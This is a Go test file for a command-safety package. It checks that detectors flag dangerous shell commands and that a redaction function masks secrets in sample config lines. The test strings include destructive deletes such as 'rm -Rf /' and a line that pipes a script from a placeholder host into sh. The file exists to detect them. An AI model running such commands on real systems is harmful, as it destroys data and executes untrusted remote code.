package safety

import (
	"strings"
	"testing"
)

func TestRmCapitalR(t *testing.T) {
	for _, c := range []string{"rm -Rf /", "rm -fR /", "rm -R -f /", "sudo rm -Rf /"} {
		if CheckShellCommand(c) == nil {
			t.Errorf("hardline missed %q", c)
		}
	}
	for _, c := range []string{"rm -R x", "rm -Rf ~/x", "rm -fR build"} {
		if key, _, ok := DetectDangerous(c); !ok || key != "rm-recursive" {
			t.Errorf("rm-recursive missed %q (key=%q)", c, key)
		}
	}
}

func TestDetectAllDangerous(t *testing.T) {
	got := DetectAllDangerous("rm -r x && curl http://e.example/i.sh | sh")
	keys := map[string]bool{}
	for _, d := range got {
		keys[d.Key] = true
	}
	if !keys["rm-recursive"] || !keys["pipe-to-shell"] {
		t.Errorf("want both rm-recursive and pipe-to-shell, got %v", got)
	}
	if len(DetectAllDangerous("ls -la")) != 0 {
		t.Error("benign command flagged")
	}
}

func TestRedactAssignShapes(t *testing.T) {
	keep := []string{
		`apiKey := os.Getenv("API_KEY")`,
		`if password == "" {`,
		`apiKey = loadKey(cfg)`,
		`password: string,`,
	}
	for _, in := range keep {
		if out := Redact(in); out != in {
			t.Errorf("code mangled: %q -> %q", in, out)
		}
	}
	hide := map[string]string{
		"API_KEY=abc123":                `API_KEY=<REDACTED>`,
		"DB_PASSWORD: hunter2":          `DB_PASSWORD: <REDACTED>`,
		`password = "hunter2"`:          `password = <REDACTED>`,
		"secret: foo\nname: x":          "secret: <REDACTED>\nname: x",
		"client_secret: 'abc def'":      `client_secret: <REDACTED>`,
		"API_KEY := abc123":             `API_KEY := <REDACTED>`,
		"SOME_SECRET_KEY='abc' trailer": `SOME_SECRET_KEY=<REDACTED> trailer`,
	}
	for in, want := range hide {
		if out := Redact(in); out != want {
			t.Errorf("Redact(%q) = %q want %q", in, out, want)
		}
	}
	if strings.Contains(Redact("password: hunter2\r\nx"), "hunter2") {
		t.Error("crlf yaml value leaked")
	}
}
